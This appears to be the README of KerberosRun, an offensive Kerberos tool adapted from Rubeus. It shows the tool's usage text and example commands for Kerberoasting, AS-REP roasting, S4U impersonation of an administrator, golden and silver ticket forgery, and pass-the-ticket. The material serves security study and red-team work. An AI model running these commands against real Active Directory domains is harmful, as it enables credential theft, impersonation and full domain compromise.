
# KerberosRun

KerberosRun is a little tool I use to study Kerberos internals together with my [ADCollector](https://github.com/dev-2null/ADCollector). I'll try to learn and implement stuff from [Rubeus](https://github.com/GhostPack/Rubeus), also something not in Rubeus.  

KerberosRun uses the [Kerberos.NET](https://github.com/dotnet/Kerberos.NET) library built by [Steve Syfuhs](https://twitter.com/stevesyfuhs). It is heavily adapated from [Harmj0y](https://twitter.com/harmj0y)'s Rubeus project (some code were taken directly from this project). 

[dev2null](https://twitter.com/dev2nulI) is the primary author of this project. My colleague [Constantin](https://twitter.com/_Herberos) is the collaborator who helped me build up the tool, had a lot of discussions with me and gave me ideas. 

Thanks Steve for builting up this great library and having discussions with me to solve code problems. Thanks Harmj0y (and other authors) for the concepts and weaponization in Rubeus. Special thanks to [@_dirkjan](https://twitter.com/_dirkjan) for helping me out regarding the KRBCRED structure and other questions.


## Authentication Flows

[AS Exchange](Authentication/AS_Exchange_DecryptedTGT.md)

[TGS Exchange: Unconstrained Delegation](Authentication/TGS_Exchange_UnconstrainedDelegation.md)

[TGS Exchange: S4U](Authentication/TGS_Exchange_S4U.md)

[TGS Exchange: Decrypted PAC](Authentication/TGS_Exchange_DecryptedWithPAC.md)

[All In One](Authentication/AllInOne.md)


## Usage
```powershell
PS C:\Users\dev2null\Desktop> .\KerberosRun.exe    

   __           __
  / /_____ ____/ /  ___ _______  ___ ______ _____
 /  '_/ -_) __/ _ \/ -_) __/ _ \(_-</ __/ // / _ \
/_/\_\\__/_/ /_.__/\__/_/  \___/___/_/  \_,_/_//_/

  v1.0.1

Usage: KerberosRun.exe -h
    
    [--AskTGT]              Ask for a TGT
        --User*             A valid username
        --Pass              A valid password
        --NopaC             Do not request PAC

    [--AskTGS]              Ask for a TGS
        --User*             A valid username
        --Pass              A valid password   
        --SPN*              Target SPN for the service request

    [--Kerberoast]          Kerberoasting
        --User*             A valid username
        --Pass              A valid password   
        --SPN*              Target SPN for Kerberoasting

    [--Asreproast]          ASREPRoasting
        --User*             A valid username that does not require PreAuth
        --Format            Output Hash format (John/Hashcat, Default: Hashcat)

    [--S4U2Self]            Service for User to Self
        --User*             A valid username that has SPN set
        --Pass              A valid password
        --ImperonsateUser*  A user to impersonate

    [--S4U]                 S4U2Self and S4U2Proxy
        --User*             A valid username that has SPN set
        --Pass              A valid password
        --Imperonsate*      A user to impersonate
        --SPN*              Target SPN for impersonate user

    [--Golden]              Build a Golden Ticket
        --RC4/AES128/AES256 krbtgt account hash
        --DomainSid*        Domain SIDs
        --UserID            User ID (default: 500)
        --User*             User name for the golden ticket

    [--Sliver]              Make a Sliver Ticket
        --RC4/AES128/AES256 Service account hash
        --DomainSid*        Domain SID
        --Service*          Service name (HTTP/CIFS/HOST...)
        --Host*             Target Servers
        --User*             User name for the sliver ticket

    [--Ticket]              Pass base64 encoded kirbi ticket into current session

     --Domain            A valid domain name (default: current domain)
     --RC4/AES128/AES256 A valid hash (alternative way for authentication) 
     --Verbose           Verbose mode
     --Outfile           Write the ticket to a kirbi file under the current directory
     --PTT               Pass the ticket into current session
     --DecryptTGT        Supply the krbtgt hash and decrypt the TGT ticket
     --DecryptTGS        Supply the service account hash and decrypt the TGS ticket
     --DecryptEtype   The encryption type of the hash for decrypting tickets (rc4/aes128/aes256) 
     --SrvName           The service account name for decrypting TGS


Example:  
        .\KerberosRun.exe --Asktgt --user username --pass password --nopac
        .\KerberosRun.exe --Asktgt --user username --pass password --verbose --outfile --decrypttgt [krbtgtHash] --decryptetype aes256
        .\KerberosRun.exe --Asktgs --user username --pass password --spn service/srv.domain.com --verbose --outfile
        .\KerberosRun.exe --Asreproast --user username --verbose
        .\KerberosRun.exe --Kerberoast --user username --rc4 [RC4Hash] --spn service/srv.domain.com
        .\KerberosRun.exe --S4U2Self --user username --aes128 [AES128Hash] --impersonateuser administrator --verbose
        .\KerberosRun.exe --S4U --user username --aes256 [AES256Hash] --impersonateuser administrator --spn ldap/dc1.domain.com --ptt
        .\KerberosRun.exe --Golden --user administrator --domain domain.com --userid 500 --domainsid  [DomainSID] --RC4 [krbtgtHash] --ptt
        .\KerberosRun.exe --Sliver --user administrator --domain domain.com --domainsid  [DomainSID] --RC4 [srvHash] --Service HTTP --HOST DC01$ -ptt
        .\KerberosRun.exe --Ticket Base64EncodedKirbiString/KirbiTicketFiles
```

## Sample Commands & Results

| [AskTGT](Authentication/Samples/AskTGT.md) | [AskTGS](Authentication/Samples/AskTGS.md) | [Asreproast](Authentication/Samples/Asreproast.md) | [Kerberoast](Authentication/Samples/Kerberoast.md) | [S4U2Self](Authentication/Samples/S4U2Self.md) | [S4U](Authentication/Samples/S4U.md) | [Golden](Authentication/Samples/Golden.md) | [Sliver](Authentication/Samples/Sliver.md) |



## License
KerberosRun has an MIT License. See the [License File](/LICENSE) for more details. Also see the [Notices file](/NOTICES) for more information on the licenses of projects this depends on.